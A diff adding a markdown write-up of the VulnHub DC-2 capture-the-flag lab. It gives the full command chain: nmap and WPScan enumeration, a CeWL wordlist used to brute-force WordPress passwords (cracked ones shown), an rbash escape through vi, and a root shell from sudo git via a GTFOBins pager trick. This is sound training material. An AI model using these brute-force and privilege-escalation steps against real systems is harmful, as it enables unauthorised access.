@@ -1,0 +1,279 @@
+# DC-2 — VulnHub CTF Writeup
+
+![Platform](https://img.shields.io/badge/Platform-VulnHub-blue) ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Linux-orange) ![Status](https://img.shields.io/badge/Status-Pwned%20%F0%9F%8F%86-brightgreen)
+
+## Machine Info
+
+| Field | Details |
+|---|---|
+| Platform | VulnHub |
+| Difficulty | Easy |
+| OS | Linux Debian 8 |
+| IP | 192.168.56.107 |
+| Hostname | dc-2 |
+| Flags | 5 |
+| Date Completed | June 3, 2026 |
+
+---
+
+## Summary
+
+DC-2 is a beginner-friendly WordPress machine. The attack chain involves generating a custom CeWL wordlist to brute force WordPress credentials, SSH access on a non-standard port, escaping a restricted shell (rbash) via vi, lateral movement between users, and privilege escalation via a sudo git misconfiguration.
+
+---
+
+## Tools Used
+
+| Tool | Purpose |
+|---|---|
+| Nmap | Port scanning |
+| CeWL | Custom wordlist generation |
+| WPScan | WordPress enumeration & brute force |
+| SSH | Remote access |
+| vi | rbash escape |
+| GTFOBins (git) | Privilege escalation |
+
+---
+
+## Enumeration
+
+### Step 1 — Hosts File Setup
+
+Initial nmap showed the site redirecting to `http://dc-2`. Added the hostname to `/etc/hosts`:
+
+```bash
+sudo nano /etc/hosts
+# Add: 192.168.56.107  dc-2
+```
+
+### Step 2 — Port Scanning
+
+Standard scan only found port 80. A full port scan revealed SSH on a non-standard port:
+
+```bash
+nmap -sC -sV 192.168.56.107        # initial scan
+nmap -sV -p- 192.168.56.107        # full port scan
+```
+
+**Results:**
+
+```
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.10 (Debian)
+7744/tcp open  ssh     OpenSSH 6.7p1 Debian
+```
+
+> **Lesson:** Always run a full `-p-` scan if the initial scan seems incomplete.
+
+### Step 3 — WordPress Enumeration
+
+The site was a WordPress 4.7.10 installation. Flag 1 was visible on the `/flag` page after loading the site.
+
+**Enumerate users with WPScan:**
+
+```bash
+wpscan --url http://dc-2 --enumerate u
+```
+
+**Found 3 users:**
+- `admin`
+- `jerry`
+- `tom`
+
+---
+
+## Flag 1
+
+> *"Your usual wordlists probably won't work, so instead, maybe you just need to be cewl."*
+
+**Location:** `http://dc-2/index.php/flag/`
+
+The hint tells us to use **CeWL** to generate a custom wordlist from the site.
+
+---
+
+## Exploitation
+
+### Custom Wordlist with CeWL
+
+```bash
+cewl http://dc-2 -d 2 -m 5 -w cewl-wordlist.txt
+wc -l cewl-wordlist.txt
+# 165 words generated
+```
+
+### WordPress Brute Force with WPScan
+
+```bash
+echo -e "admin\njerry\ntom" > users.txt
+wpscan --url http://dc-2 -U users.txt -P cewl-wordlist.txt
+```
+
+**Cracked credentials:**
+
+```
+[SUCCESS] tom : parturient
+[SUCCESS] jerry : adipiscing
+```
+
+Admin password was not in the CeWL wordlist — *"sometimes you just can't win them all"* (as Flag 1 hinted).
+
+---
+
+## Flag 2
+
+**Location:** WordPress Pages → Flag 2 (visible after logging in as jerry)
+
+> *"If you can't exploit WordPress and take a shortcut, there is another way. Hope you found another entry point."*
+
+The hint points to SSH — the other entry point found during enumeration.
+
+---
+
+## Getting a Shell
+
+### SSH Login on Port 7744
+
+```bash
+ssh tom@192.168.56.107 -p 7744
+# password: parturient
+```
+
+Logged in successfully but hit a **restricted shell (rbash)**:
+
+```
+-rbash: cat: command not found
+```
+
+---
+
+## Flag 3
+
+**Location:** `/home/tom/flag3.txt` (read via vi since cat was blocked)
+
+> *"Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes."*
+
+The hint: use `su` to switch to jerry.
+
+---
+
+## Post-Exploitation
+
+### Escaping rbash via vi
+
+```bash
+vi
+:set shell=/bin/bash
+:shell
+export PATH=$PATH:/usr/bin:/bin
+```
+
+### Lateral Movement — tom → jerry
+
+```bash
+su jerry
+# password: adipiscing
+```
+
+---
+
+## Flag 4
+
+**Location:** `/home/jerry/flag4.txt`
+
+```bash
+cat /home/jerry/flag4.txt
+```
+
+> *"Good to see that you've made it this far - but you're not home yet. Go on - git outta here!!!!"*
+
+The hint: **git** — check sudo permissions.
+
+---
+
+## Privilege Escalation
+
+### Sudo Misconfiguration — git
+
+```bash
+sudo -l
+# (root) NOPASSWD: /usr/bin/git
+```
+
+Jerry can run `git` as root without a password. Using the [GTFOBins](https://gtfobins.github.io/gtfobins/git/) technique:
+
+```bash
+sudo git -p help config
+# When the pager opens, type:
+!/bin/bash
+```
+
+Root shell obtained! 🎉
+
+```
+root@DC-2:~#
+```
+
+---
+
+## Flag 5 (Final Flag)
+
+**Location:** `/root/final-flag.txt`
+
+```bash
+cat /root/final-flag.txt
+# Congratulations!!!
+```
+
+---
+
+## Flags Summary
+
+| Flag | Location | Method |
+|---|---|---|
+| Flag 1 | `http://dc-2/flag` | Visible on WordPress page |
+| Flag 2 | WordPress Pages (as jerry) | WordPress login with brute-forced creds |
+| Flag 3 | `/home/tom/flag3.txt` | SSH login as tom on port 7744 |
+| Flag 4 | `/home/jerry/flag4.txt` | Lateral movement via `su jerry` |
+| Flag 5 | `/root/final-flag.txt` | Root shell via sudo git GTFOBins |
+
+---
+
+## Attack Chain
+
+```
+Nmap (full port scan)
+    ↓
+WordPress enumeration (WPScan)
+    ↓
+Custom wordlist (CeWL) → Brute force → Credentials
+    ↓
+SSH login on port 7744 (tom)
+    ↓
+rbash escape via vi
+    ↓
+su jerry (lateral movement)
+    ↓
+sudo git → GTFOBins → root shell
+    ↓
+🏆 All 5 flags captured
+```
+
+---
+
+## Key Takeaways
+
+- Always run a **full port scan** (`-p-`) — non-standard ports are common in CTFs
+- **CeWL** generates target-specific wordlists that generic lists miss
+- **rbash** can be escaped via editors like vi/vim that can spawn shells
+- Always run **`sudo -l`** after getting a shell — sudo misconfigurations are a very common privesc vector
+- Check [GTFOBins](https://gtfobins.github.io) for any binary you can run with sudo
+
+---
+
+## References
+
+- [VulnHub DC-2](https://www.vulnhub.com/entry/dc-2,311/)
+- [GTFOBins — git](https://gtfobins.github.io/gtfobins/git/)
+- [WPScan](https://wpscan.com)
+- [CeWL GitHub](https://github.com/digininja/CeWL)
